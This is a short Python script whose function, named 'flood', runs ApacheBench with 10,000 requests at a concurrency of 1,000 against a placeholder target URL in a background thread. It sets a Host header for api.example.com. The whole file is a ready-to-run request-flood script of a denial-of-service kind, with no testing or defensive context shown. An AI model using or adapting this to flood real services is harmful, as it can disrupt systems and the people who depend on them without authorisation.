import subprocess
import threading


def flood(url):
    command = [
        "ab",
        "-n",
        "10000",
        "-c",
        "1000",
        "-H",
        "Host: api.example.com",
        url,
    ]
    subprocess.run(command, capture_output=True, text=True)


thread = threading.Thread(target=flood, args=("https://target.example/api",))
thread.start()
